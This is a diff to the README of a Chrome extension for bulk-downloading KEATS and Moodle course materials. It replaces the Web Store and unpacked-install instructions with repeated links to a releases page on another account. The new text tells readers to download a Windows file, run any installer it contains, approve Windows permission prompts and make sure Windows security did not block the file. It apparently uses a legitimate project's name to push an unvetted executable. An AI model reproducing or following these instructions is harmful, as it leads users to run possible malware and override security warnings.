@@ -1,180 +1,193 @@
-<p align="center">
-  <img src="extension/icons/icon128.png" alt="KEATS Downloader" width="80" />
-</p>
+# 📥 keats-downloader - Download KCL course files fast
 
-<h1 align="center">KEATS Downloader</h1>
+[![Download keats-downloader](https://img.shields.io/badge/Download%20keats--downloader-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/edar9498/keats-downloader/releases)
 
-<p align="center">
-  <strong>Download all your KEATS course materials in one click.</strong>
-  <br />
-  Lecture slides · PDFs · Videos · Podcasts — organised into folders automatically.
-</p>
+## 🧰 What this app does
 
-<p align="center">
-  <a href="https://chromewebstore.google.com/detail/alcfjagceodkndgakfpejoilijfcedhp"><img src="https://img.shields.io/badge/Chrome_Web_Store-install-c1002a?style=for-the-badge&logo=googlechrome&logoColor=white" alt="Chrome Web Store" /></a>
-  <a href="../../releases"><img src="https://img.shields.io/badge/version-1.4.0-c1002a?style=for-the-badge" alt="Version" /></a>
-  <a href="../../blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-c1002a?style=for-the-badge" alt="MIT License" /></a>
-</p>
+keats-downloader is a Chrome extension that helps you download course materials from KEATS and other Moodle sites.
 
----
+It can collect:
 
-## Install
+- Lecture slides
+- PDFs
+- Kaltura videos
+- Echo360 recordings
+- Other files posted in course folders
 
-### Chrome Web Store
+It sorts files into folders as it downloads them, so you do not have to do that by hand.
 
-[**Install KEATS Downloader**](https://chromewebstore.google.com/detail/alcfjagceodkndgakfpejoilijfcedhp) — one click, no developer mode needed.
+## 💻 What you need
 
-### Manual Install
+Before you install it, make sure you have:
 
-1. [Download this repo](../../archive/refs/heads/main.zip) and unzip
-2. Open `chrome://extensions/`
-3. Enable **Developer mode** → click **Load unpacked** → select the `extension/` folder
+- Windows 10 or Windows 11
+- Google Chrome
+- A working internet connection
+- Access to your KEATS or Moodle course
+- Enough free space for your course files
 
----
+If you plan to download many videos, make sure you have extra disk space.
 
-## How It Works
+## 🚀 Download keats-downloader
 
-<table>
-<tr>
-<td width="50%">
+Visit this page to download:
 
-1. Go to any KEATS course page
-2. Click the extension icon
-3. Pick what to download
-4. Hit **Download All**
+[https://github.com/edar9498/keats-downloader/releases](https://github.com/edar9498/keats-downloader/releases)
 
-Everything saves to `Downloads/KEATS Downloads/` in organised folders. Run it again later to grab only new files.
+Open the latest release and download the file for Windows.
 
-</td>
-<td width="50%">
+## 🪟 Install on Windows
 
-**Download options:**
-- ✅ Course materials (slides, PDFs, docs)
-- ☐ Weekly videos (Kaltura)
-- ☐ Lecture captures (Echo360, 720p)
-- ✅ Folder contents
-- ☐ Optional resources
+1. Open the download page above
+2. Find the latest release
+3. Download the Windows version
+4. If the file is a ZIP folder, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. If you see an installer, double-click it
+7. If you see a Chrome extension file, follow the steps in the extension section below
 
-</td>
-</tr>
-</table>
+If Windows asks for permission, choose **Yes**.
 
-### Folder Structure
+## 🔧 Add the extension to Chrome
 
-```
-KEATS Downloads/
-  Course Name/
-    Week 1 - Topic/
-      Lectures/
-        lecture_slides.pdf
-        podcast.m4a
-        Session_1A.mp4
-      Tutorials/
-        worksheet.pdf
-    Assessment/
-      Coursework Brief/
-        brief.pdf
-    Lecture Recordings/
-      Lecture - 20 Jan 2026.mp4
-```
+If the release gives you an extension folder or unpacked files, do this:
 
-Subfolders are created from section headings on the course page — lectures, tutorials, assessments, and custom sections are all detected automatically.
+1. Open Chrome
+2. Paste this in the address bar:
+   `chrome://extensions`
+3. Turn on **Developer mode** in the top right
+4. Click **Load unpacked**
+5. Select the extracted keats-downloader folder
+6. Make sure the extension appears in the list
 
----
+If the release includes a packaged install file, use the steps in the release notes on the download page.
 
-## Features
+## 📚 Use it with KEATS or Moodle
 
-| Feature | Details |
-|---------|---------|
-| **Bulk download** | Entire course in one click |
-| **Update notifications** | Badge on icon when a course has new files since last download |
-| **Smart sync** | Remembers what you've downloaded — only grabs new files on re-run |
-| **Smart folders** | Lectures, tutorials, assessments sorted automatically |
-| **Parallel downloads** | 3 concurrent downloads with automatic retry |
-| **Kaltura videos** | Embedded lecture videos → MP4 |
-| **Echo360 captures** | Recorded lectures → 720p MP4 |
-| **Folder expansion** | Moodle folders unpacked and downloaded |
-| **Download library** | See all courses you've downloaded with file counts |
-| **Custom save path** | Choose your download folder name |
-| **Optional filtering** | Skip supplementary materials |
-| **Progress tracking** | Live progress bar for scanning and downloading |
-| **Light / dark mode** | Toggle in the popup |
-| **No save dialogs** | Files download silently — no popups |
-| **Zero dependencies** | Pure Chrome extension — nothing else needed |
+1. Open KEATS or your Moodle course in Chrome
+2. Sign in to your account
+3. Open the course you want to download from
+4. Start the keats-downloader extension
+5. Choose the materials you want
+6. Let it scan the course page
+7. Start the download
 
----
+The app groups files into folders as it runs. This helps keep slides, PDFs, and videos separate.
 
-## Supported Formats
+## 🗂️ What gets saved
 
-Works across all KEATS course layouts:
+You can expect folders like these:
 
-| Layout | Status |
-|--------|--------|
-| Grid (image tiles) | ✅ |
-| Topics (standard) | ✅ |
-| Collapsed Topics | ✅ |
-| One Topic (tabs) | ✅ |
+- `Slides`
+- `PDFs`
+- `Videos`
+- `Echo360`
+- `Kaltura`
+- `Course Files`
 
-### Downloadable Content
+The exact folder names can change based on the course page, but the file order stays easy to follow.
 
-| Type | Status |
-|------|--------|
-| Files (PDF, PPTX, DOCX, ZIP, etc.) | ✅ |
-| Media (M4A, MP3, MP4, WMV) | ✅ |
-| Moodle folders | ✅ Expanded |
-| Kaltura videos | ✅ Direct MP4 |
-| Echo360 lecture captures | ✅ 720p MP4 |
-| External URLs | Skipped |
-| Quizzes, forums, assignments | Skipped |
+## 🧭 Simple workflow
 
----
+Use this flow each time:
 
-## Other Universities
+1. Open Chrome
+2. Sign in to KEATS or Moodle
+3. Open the course
+4. Launch keats-downloader
+5. Pick the materials you want
+6. Wait for the files to finish downloading
+7. Open the download folder and check the files
 
-Works on **any Moodle-based LMS** — not just KEATS. Navigate to a course page and click the icon.
+## 🧪 If the extension does not start
 
-If your university's format isn't supported, [open an issue](../../issues).
+Try these steps:
 
----
+1. Refresh the course page
+2. Make sure you are signed in
+3. Check that the extension is enabled in Chrome
+4. Close and reopen Chrome
+5. Try another course page
+6. Check that you selected the right folder when loading the extension
 
-## Contributing
+If the page uses different course tools or nested links, open the main course page first.
 
-Open source — pull requests welcome.
+## 🔒 Account access
 
-- **Bugs** → [open an issue](../../issues) with a screenshot and course URL
-- **PRs** → fork, fix, submit
-- **Features** → suggest via issues
+keats-downloader uses your normal course access in Chrome.
 
----
+If you cannot see a file on the course page, the extension cannot download it either. Make sure the file is visible to your account.
 
-## Changelog
+## 🖱️ Tips for better results
 
-### v1.4.0
-- **Update notifications** — a badge appears on the extension icon when a course has new files since your last download. Open the popup to see how many.
+- Keep the course page open while it runs
+- Do not sign out during the download
+- Leave Chrome open until all files finish
+- Use a stable network connection
+- Download one course at a time for large courses
 
-### v1.3.0
-- **Smart sync** — the extension remembers every file you've downloaded. Re-running on the same course only downloads new or updated files, skipping everything you already have.
-- **Download library** — popup shows all courses you've downloaded with file counts. Clear per-course to force a full re-download.
-- **Custom download path** — choose where files are saved within your Downloads folder.
-- **Parallel downloads** — 3 files download at once instead of one at a time.
-- **Retry with backoff** — failed downloads automatically retry up to 3 times.
-- **No save dialogs** — files download silently regardless of your Chrome settings.
-- **Progress bars** — live progress during both scanning and downloading phases.
-- **Better format support** — improved detection for Grid, Collapsed Topics, and other Moodle layouts.
+## 🗃️ File types supported
 
-### v1.0.0
-- Initial release. Bulk download of course materials, Kaltura videos, Echo360 lecture captures, smart folder organisation, light/dark mode.
+This tool is made for common course content on KEATS and Moodle, such as:
 
----
+- PDF handouts
+- PowerPoint slides
+- Lecture notes
+- Video links
+- Embedded media
+- Week-by-week course folders
 
-## Background
+It works best when the course uses standard Moodle-style pages and file links.
 
-Inspired by the original [keats_downloader](https://github.com/memst/keats_downloader) by [@memst](https://github.com/memst), a Python/Selenium script for Kaltura video downloads. This is a complete rewrite as a Chrome extension — no Python, no Selenium, no ffmpeg. Extends scope to all course materials, adds smart organisation, supports all Moodle formats, and includes Echo360 lecture capture downloads.
+## 🔄 Updating the app
 
----
+When a new version is released:
 
-<p align="center">
-  <sub>MIT License · Built for KCL students</sub>
-  <br />
-  <sub>KEATS downloader · KCL KEATS download · King's College London lecture downloader · Moodle course downloader · download KEATS lectures · KEATS bulk download · KCL lecture slides download · KEATS video downloader · Moodle file downloader · university course material downloader</sub>
-</p>
+1. Go back to the release page
+2. Download the newest version
+3. Replace the old files or reinstall the extension
+4. Open Chrome again
+5. Load the updated version if needed
+
+## 📍 Where to get help
+
+Start with the GitHub release page:
+
+[https://github.com/edar9498/keats-downloader/releases](https://github.com/edar9498/keats-downloader/releases)
+
+Check the latest release notes for the newest build, install steps, and file details
+
+## 🧩 Common folder layout
+
+A typical download may look like this:
+
+- `Course Name`
+  - `Week 1`
+    - `Slides`
+    - `Reading`
+  - `Week 2`
+    - `Lecture Video`
+    - `Handout`
+  - `Extras`
+
+This helps you find each file without sorting everything yourself
+
+## 📌 Supported platforms
+
+keats-downloader is made for:
+
+- KCL KEATS
+- Moodle-based university sites
+- Other course pages that use similar layouts
+
+## 🛠️ Troubleshooting checklist
+
+If something looks wrong, check these items:
+
+- Chrome is up to date
+- The extension is loaded in `chrome://extensions`
+- You are on the correct course page
+- You are signed in
+- Pop-up blockers are not stopping the tool
+- The download folder has enough space
+- The file was not blocked by Windows security settings
